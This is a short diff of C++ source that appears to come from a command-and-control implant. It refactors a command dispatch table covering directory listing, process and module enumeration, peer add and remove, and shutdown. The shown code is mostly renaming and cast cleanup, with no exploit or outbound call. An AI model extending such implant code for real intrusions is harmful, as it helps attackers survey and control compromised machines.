@@ -6,17 +6,17 @@ using namespace Dispatcher;
 
 namespace Commands {
 
-    RDATA HASH_MAP cmd_map[] = {
-        { .name = DIRECTORYLIST, 	.address = (void*) DirectoryList        },
-        { .name = PROCESSMODULES,	.address = (void*) ProcessModules       },
-        { .name = PROCESSLIST,		.address = (void*) ProcessList          },
-        { .name = ADDPEER,			.address = (void*) CommandAddPeer       },
-        { .name = REMOVEPEER,		.address = (void*) CommandRemovePeer    },
-        { .name = SHUTDOWN,			.address = (void*) Shutdown             },
-        { .name = 0,				.address = (void*) nullptr		        },
+    RDATA_SEC HASH_MAP cmd_map[] = {
+        { .name = DIRECTORYLIST, 	.address = Commands::DirectoryList        },
+        { .name = PROCESSMODULES,	.address = Commands::ProcessModules       },
+        { .name = PROCESSLIST,		.address = Commands::ProcessList          },
+        { .name = ADDPEER,			.address = Commands::CommandAddPeer       },
+        { .name = REMOVEPEER,		.address = Commands::CommandRemovePeer    },
+        { .name = SHUTDOWN,			.address = Commands::Shutdown             },
+        { .name = 0,				.address = nullptr		                  },
     };
 
-    VOID DirectoryList (_parser *const parser) {
+    VOID DirectoryList (_parser *parser) {
         HEXANE;
 
         _stream *out = CreateTaskResponse(DIRECTORYLIST);
@@ -94,7 +94,7 @@ namespace Commands {
         }
     }
 
-    VOID ProcessModules (_parser *const parser) {
+    VOID ProcessModules (_parser *parser) {
         HEXANE;
 
         _stream *out = CreateTaskResponse(PROCESSMODULES);
